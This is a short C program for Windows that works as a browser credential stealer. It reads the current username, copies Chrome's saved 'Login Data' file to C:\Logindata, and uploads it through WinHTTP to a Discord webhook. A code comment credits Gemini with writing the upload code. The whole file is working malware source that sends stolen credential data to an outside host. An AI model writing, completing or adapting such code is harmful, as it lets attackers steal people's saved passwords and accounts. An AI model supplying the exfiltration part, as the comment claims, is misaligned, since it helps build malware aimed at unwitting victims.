#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <Lmcons.h>
#include <wchar.h>




//wirtten by me because I'm better 
//main function, grabs the username and copies the Chrome login data file to C:\Logindata, then would send it to the webhook
int main(void){

    char username [UNLEN +1];
    DWORD username_len = UNLEN +1;


    if(GetUserNameA(username, &username_len)) {
        printf("Username: %s\n", username);
    } else {
        printf("Could not get username.\n");
    }



    char password_path[256];
    sprintf_s(password_path, sizeof(password_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username);

    printf("Password Path: %s\n", password_path);
    LPCSTR password_path_pointer = &password_path[0];



    if(CopyFileA(password_path_pointer, "C:\\Logindata", FALSE)) {
        printf("File copied successfully.\n");
    } else {
        printf("File copy failed: %lu\n", GetLastError());
    }


    //coded by gemini because that's API stuff, sends the copied file to the discord webhook

        // 1. Split the webhook URL into Host and Path
        LPCWSTR serverName = L"discord.com";
    LPCWSTR objectName = L"/api/webhooks/....";
    const char* filePath = "C:\\Logindata"; // Ensure this file exists in your folder
    const char* boundary = "----Boundary123";

    // 2. Read the local file into memory
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { printf("File not found!\n"); return 1; }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* fileBuffer = (char*)malloc(fileSize);
    ReadFile(hFile, fileBuffer, fileSize, &fileSize, NULL);
    CloseHandle(hFile);

    // 3. Construct the Multipart Body
    char bodyStart[512];
    sprintf(bodyStart, 
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n", 
        boundary, filePath);
    
    const char* bodyEnd = "\r\n------Boundary123--\r\n";
    
    // Total size = header + file data + footer
    DWORD totalBodySize = (DWORD)strlen(bodyStart) + fileSize + (DWORD)strlen(bodyEnd);
    char* fullBody = (char*)malloc(totalBodySize);
    
    memcpy(fullBody, bodyStart, strlen(bodyStart));
    memcpy(fullBody + strlen(bodyStart), fileBuffer, fileSize);
    memcpy(fullBody + strlen(bodyStart) + fileSize, bodyEnd, strlen(bodyEnd));

    // 4. Send with WinHTTP
    HINTERNET hSession = WinHttpOpen(L"DiscordBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", objectName, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    WCHAR headerWithBoundary[100];
    swprintf(headerWithBoundary, 100, L"Content-Type: multipart/form-data; boundary=%S", boundary);

    if (WinHttpSendRequest(hRequest, headerWithBoundary, -1, fullBody, totalBodySize, totalBodySize, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        printf("File sent successfully!\n");
    }

    // Clean up
    free(fileBuffer); free(fullBody);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return 0;

    return 0; 



}

